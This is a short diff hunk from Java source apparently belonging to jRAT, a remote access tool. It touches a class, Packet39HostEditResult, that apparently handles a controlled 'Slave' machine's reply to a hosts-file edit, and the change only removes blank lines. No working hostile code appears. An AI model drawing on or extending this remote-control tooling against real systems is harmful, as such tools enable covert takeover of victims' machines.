@@ -8,8 +8,6 @@ import pro.jrat.Slave;
 import pro.jrat.ui.frames.FrameControlPanel;
 import pro.jrat.ui.panels.PanelControlHostsFile;
 
-
-
 public class Packet39HostEditResult extends AbstractIncomingPacket {
 
 	@Override
